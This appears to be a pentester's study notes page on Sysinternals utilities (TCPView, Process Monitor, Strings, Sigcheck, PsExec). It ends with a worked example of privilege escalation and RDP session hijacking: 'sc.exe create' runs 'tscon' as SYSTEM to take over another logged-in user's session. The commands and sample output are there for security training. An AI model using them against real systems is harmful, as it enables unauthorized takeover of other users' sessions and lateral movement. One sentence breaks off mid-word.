---
title: SysInternals Suite
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - windows
  - thick applications
---
# SysInternals Suite

To download: [https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite](https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite).

 The Windows Sysinternals website was created in 1996 by [Mark Russinovich](https://en.wikipedia.org/wiki/Mark_Russinovich) and [Bryce Cogswell](https://en-academic.com/dic.nsf/enwiki/2358707) to offers technical resources and utilities to manage, diagnose, troubleshoot, and monitor a Microsoft Windows environment. Microsoft acquired Windows Sysinternals and its assets on July 18, 2006.
 
## TPCView

Application that allows you to see incoming and outcoming network connections associated to their application.

In the course "Mastering Thick Application Pentesting" this is really helpfil to check the conections of the vulnerable applicaiton DVTA.


## Process Monitor

This tools helps us understand File System changes and what is being accessed in the file system.

## Strings

It's similar to the command "strings" in bash. It displays all the human readable strings in a binary.  Usage:

```ps
strings.exe <binaryFile>
```


## Sigcheck

Sigcheck is a command-line utility that shows file version number, timestamp information, and digital signature details, including certificate chains.

```powershell

.\sigcheck.exe -nobanner -s -e <folder/binaryFile>
# -s: Search recursively, useful for thick client apps with lot of folders and subfolders
# -e: Scan executable images only (regardless of their extension)
# -nobanner:	Do not display the startup banner and copyright message.
```


## PsExec

[PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) is a tool that lets us execute processes on other systems, complete with full interactivity for console applications, without having to install client software manually. It works because it has a Windows service image inside of its executable. 

It takes this service and deploys it to the admin$ share (by default) on the remote machine. It then uses the DCE/RPC interface over SMB to access the Windows Service Control Manager API. Next, it starts the PSExec service on the remote machine. The PSExec service then creates a [named pipe](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes) that can send commands to the system.

### PsExec for escalating privileges: This method no longer works on Server 2019

PsExec is particularly effective for privilege escalation because it can create and run processes with SYSTEM privileges, even if executed from an Administrator account. Here’s how this process typically works:

- **Command Execution as SYSTEM**: When using PsExec with the `-s` flag (e.g., `psexec -s cmd.exe`), it launches a process that runs with SYSTEM privileges instead of the Administrator privileges of the account running it.
- **How It Works Internally**: PsExec does this by leveraging Windows services, which typically run as SYSTEM by default. PsExec creates a temporary service on the machine to launch a command or program with SYSTEM privileges, then removes the service after completion.
- **Escalation Path**: Once PsExec launches a command prompt or other executable with SYSTEM privileges, the user essentially has unrestricted access. This enables them to perform actions that would other


**Example of an exploitation: creating a service that will run as SYSTEM**

```cmd-session
query user
```

Results:

```
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
```


```cmd-session
sc.exe create Nameofservice binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```

**Explanation**: Create a Windows service that, by default, run as `Local System` and will execute any binary with `SYSTEM` privileges. We use [Microsoft sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) binary. First, we specify the service name (`Nameofservice`) and the `binpath`, which is the command we want to execute. Once we run the following command, a service named `Nameofservice` will be created.

Initiate the service:

```
net start Nameofservice
```

Once the service is started, a new terminal with the `lewen` user session will appear. With this new account, we can attempt to discover what kind of privileges it has on the network, and maybe we'll get lucky, and the user is a member of the Help Desk group with admin rights to many hosts or even a Domain Admin.